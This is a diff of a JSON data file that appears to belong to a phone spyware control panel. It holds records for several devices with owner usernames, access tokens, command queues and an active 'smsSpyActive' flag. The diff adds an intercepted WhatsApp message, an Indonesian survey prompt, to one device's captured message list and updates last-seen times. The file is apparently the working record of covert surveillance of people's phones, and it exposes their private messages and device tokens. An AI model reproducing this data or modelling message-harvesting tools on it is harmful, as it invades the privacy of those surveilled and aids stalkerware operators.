@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776767773597,
+    "lastSeen": 1776767794925,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "UReport Indonesia",
+        "content": "Gimana pengalaman U-Reporters di dunia online? \n\nPendapatmu bakal diteruskan tim UNICEF Global ke perusahaan teknologi & operator seluler supaya bisa bikin kebijakan yang lebih baik! \n\nMau berkontribusi?  \nA. Ya\nB. Tidak\n\nPilih tombol yang tersedia atau kirim pesan STOP jika ingin berhenti terima pesan",
+        "time": "21/04 18:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767774034
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8586,7 +8594,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776767771284,
+    "lastSeen": 1776767795638,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -8627,7 +8635,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776767773031,
+    "lastSeen": 1776767796379,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
